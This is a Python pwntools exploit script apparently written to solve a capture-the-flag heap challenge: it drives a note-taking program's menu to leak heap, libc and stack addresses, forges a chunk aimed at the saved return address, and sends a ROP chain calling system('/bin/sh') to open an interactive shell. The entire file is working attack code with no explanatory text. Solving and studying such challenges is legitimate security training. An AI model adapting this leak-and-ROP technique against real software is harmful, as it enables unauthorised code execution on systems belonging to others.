#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.39.so")

context.binary = exe
# context.terminal = ["tmux", "splitw", "-h"] 
gdbscript = '''
breakrva 0x0000000000001F32
'''

def conn():
    if args.LOCAL:
        # r = gdb.debug([exe.path], gdbscript)
        r = process([exe.path])
    else:
        r = remote("localhost", 1611)

    return r

r = conn()
def register(username, password):
    r.sendlineafter(b'Your choice: ', b'1')
    r.sendlineafter(b'Enter your full name: ', b'hieuvd')
    r.sendlineafter(b'Enter your username: ', username)
    r.sendlineafter(b'Enter your password: ', password)

def login(username, password):
    r.sendlineafter(b'Your choice: ', b'2')
    r.sendlineafter(b'Enter your username: ', username)
    r.sendlineafter(b'Enter your password: ', password)

def logout():
    r.sendlineafter(b'Your choice: ', b'3')

def add_note(title, content):
    r.sendlineafter(b'Your choice: ', b'1')
    r.sendlineafter(b'Enter note title: ', title)
    r.sendlineafter(b'Enter note content: ', content)

def delete_note(title):
    r.sendlineafter(b'Your choice: ', b'4')
    r.sendlineafter(b"Enter the title of the note you want to delete: ", title)

def view_profile():
    r.sendlineafter(b'Your choice: ', b'1')
def edit_fullname(fullname):
    r.sendlineafter(b'Your choice: ', b'2')
    r.sendlineafter(b'Your choice: ', b'1')
    r.sendlineafter(b'Enter new full name: ', fullname)
def main():

    # good luck pwning :)
    register(b'grass', b'1')
    register(b'grass', b'12')
    register(b'grass', b'123')
    login(b'grass', b'12')
    r.sendlineafter(b'Your choice: ', b'4')
    for i in range(16):
        add_note(b'grass', b'grass')
    add_note(b'grass', b'grass')
    add_note(b'grass', b'grass')
    r.sendlineafter(b'Your choice: ', b'5')
    r.sendlineafter(b'Your choice: ', b'5')

    view_profile()
    r.recvuntil(b'Username: ')
    heap_leak = u64(r.recv(6).ljust(8, b'\x00'))
    heap_base = heap_leak - 0x2bd0
    r.sendlineafter(b'Your choice: ', b'3')

    logout()
    login(b'grass', b'123')
    r.sendlineafter(b'Your choice: ', b'4')
    for i in range(8+4+4):
        add_note(b'grass', b'grass')
    r.sendlineafter(b'Your choice: ', b'5')
    r.sendlineafter(b'Your choice: ', b'3')
    login(b'grass', b'1')

    r.sendlineafter(b'Your choice: ', b'4')
    for i in range(8):
        delete_note(b'grass')
    r.sendlineafter(b'Your choice: ', b'5')
    r.sendlineafter(b'Your choice: ', b'3')
    
    new_username = p64(heap_base + 0x3650)
    new_password = p64(heap_base + 0x3b90)
    login(new_username, new_password)
    r.sendlineafter(b'Your choice: ', b'5')
    edit_fullname(p64(heap_base + 0x1ef0))

    r.sendlineafter(b'Your choice: ', b'3')
    r.sendlineafter(b'Your choice: ', b'3')
    
    login(b'grass', b'1')
    r.sendlineafter(b'Your choice: ', b'4')
    r.sendlineafter(b'Your choice: ', b'2')
    for i in range(0x19):
        r.recvuntil(b'Content: grass\n')
    r.recvuntil(b'Title: ')
    libc_leak = u64(r.recv(6).ljust(8, b'\x00'))
    libc.address = libc_leak - 0x203b20

    r.sendlineafter(b'Your choice: ', b'5')
    r.sendlineafter(b'Your choice: ', b'3')

    login(new_username, new_password)
    r.sendlineafter(b'Your choice: ', b'5')
    edit_fullname(p64(libc.sym['environ']))
    r.sendlineafter(b'Your choice: ', b'3')
    r.sendlineafter(b'Your choice: ', b'3')


    login(b'grass', b'1')
    r.sendlineafter(b'Your choice: ', b'4')
    r.sendlineafter(b'Your choice: ', b'2')
    for i in range(0x19):
        r.recvuntil(b'Content: grass\n')
    r.recvuntil(b'Title: ')
    stack_leak = u64(r.recv(6).ljust(8, b'\x00'))
    return_address = stack_leak - 0x190
    r.sendlineafter(b'Your choice: ', b'5')
    r.sendlineafter(b'Your choice: ', b'3')

    login(new_username, new_password)
    r.sendlineafter(b'Your choice: ', b'4')
    fake_chunk = b'a'*0x20 + p64(return_address)
    add_note(b'bbbbbbbb', fake_chunk)
    delete_note(b'bbbbbbbb')
    fake_chunk = b'a'*0x18
    add_note(b'bbbbbbbb', fake_chunk)

    fake_chunk_address = heap_base + 0x1da0
    r.sendlineafter(b'Your choice: ', b'5')
    r.sendlineafter(b'Your choice: ', b'5')
    edit_fullname(p64(fake_chunk_address))
    r.sendlineafter(b'Your choice: ', b'3')
    r.sendlineafter(b'Your choice: ', b'3')

    login(b'grass', b'1')
    r.sendlineafter(b'Your choice: ', b'4')
    for i in range(24):
        delete_note(b'grass')

    r.sendlineafter(b'Your choice: ', b'3')
    r.sendlineafter(b'Enter the title of the note you want to edit: ', b'a'*0x18)
    # 0x000000000010f75b : pop rdi ; ret
    # 0x000000000002882f : ret
    pop_rdi = libc.address + 0x000000000010f75b
    system = libc.sym['system']
    bin_sh = next(libc.search(b'/bin/sh'))
    pop_rsi = libc.address + 0x0000000000110a4d
    ret = libc.address + 0x000000000002882f
    rop = p64(pop_rdi) + p64(bin_sh) + p64(ret) + p64(system)

    r.sendlineafter(b'Enter new content: ', rop)
    log.info(f"Return address: {hex(return_address)}")
    log.success(f"Stack leak: {hex(stack_leak)}")
    log.success(f"Libc leak: {hex(libc_leak)}")
    log.success(f"Libc base: {hex(libc.address)}")
    log.info(f'Heap leak: {hex(heap_leak)}')
    log.success(f"Heap base: {hex(heap_base)}")
    

    r.interactive()


if __name__ == "__main__":
    main()

